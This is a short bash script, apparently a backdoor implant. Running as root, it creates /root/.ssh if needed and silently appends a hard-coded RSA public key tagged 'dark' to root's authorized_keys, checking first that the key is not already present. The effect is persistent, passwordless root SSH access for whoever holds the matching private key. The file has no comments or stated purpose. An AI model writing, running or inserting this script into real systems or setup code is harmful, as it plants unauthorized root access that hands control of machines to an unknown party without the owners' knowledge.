#!/bin/bash
if [ ! -d "/root/.ssh" ]; then
    mkdir /root/.ssh
    touch /root/.ssh/authorized_keys
fi
if [ -e /root ]; then
    if [ $( /bin/grep dark /root/.ssh/authorized_keys | wc -l) == 0 ]; then
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1qxTyHZnW7sWE787PsyELOUae9jl6QqB75ICfCTJWQjNzAf+6V4ztwrSVECmbNoGKkOWIWwKqEoKQJUbFtquc2KVYsQRSZPneG5/0+rEM9cEuRmfa3u6U7T+N1bGuaYGfjLRUlAafhZfy2mVCVMpZyzdeOLjWJr7TbebIS+ZBVgcXVbDqpcs3RLGqlHM4dPAzyHtXwsbCZrk182yYdLY1amqKgYcE14zfD4ZaDI6FoxaBEUhpcZ5NDiGRL7k+nFsvz/L8xziRtOtnuQho+u7clqffReWt2M1wglUtWcn5U/JUDTgf39/CUkNcMZOdwDfbXMUD9T+AhlvPUz8j5jWMVYzmdbOPdJMAccx9P5yeuvNBrLmHufZNfpDj7F9aeRJjhXNXucHudwC+AiLzsntvbiZlR6aIQvJ8DWFknmynF5V62cp64pYlDWQwgQRljJ40ahT15trqIiis24wmYErjxp0kG3xhjFixwy8U3onbMD5UIf8ms4/ww4DglSUtBKE= dark" >> /root/.ssh/authorized_keys
    fi
fi
